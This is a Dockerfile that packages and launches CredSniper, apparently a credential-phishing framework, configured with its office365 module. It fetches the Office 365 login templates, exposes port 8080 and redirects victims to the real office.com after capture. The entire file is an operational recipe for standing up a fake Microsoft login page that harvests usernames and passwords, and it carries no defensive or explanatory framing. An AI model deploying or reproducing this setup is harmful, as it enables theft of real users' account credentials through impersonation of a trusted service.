FROM python:3.11-slim
RUN apt-get update && DEBIAN_FRONTEND=noninteractive apt-get install -y chromium unzip wget && rm -rf /var/lib/apt/lists/*
RUN CHROMIUM_VERSION=$(chromium --version | awk '{print $2}' | cut -d'.' -f1) && \
    wget -qO /tmp/chromedriver.zip https://storage.googleapis.com/chrome-for-testing-public/${CHROMIUM_VERSION}.0/linux64/chromedriver-linux64.zip && \
    unzip /tmp/chromedriver.zip -d /usr/bin && mv /usr/bin/chromedriver-linux64/chromedriver /usr/bin/chromedriver && chmod +x /usr/bin/chromedriver && rm -rf /tmp/chromedriver.zip /usr/bin/chromedriver-linux64
WORKDIR /app
COPY CredSniper /app/CredSniper
RUN pip install --no-cache-dir -r /app/CredSniper/requirements.txt
RUN python /app/CredSniper/modules/office365/fetch_templates.py
ENV HOSTNAME_ENV=example.com
ENV FINAL_URL=https://www.office.com/?auth=2
EXPOSE 8080
CMD ["sh","-c","python /app/CredSniper/credsniper.py --module office365 --port ${PORT:-8080} --final ${FINAL_URL} --hostname ${HOSTNAME_ENV}"] 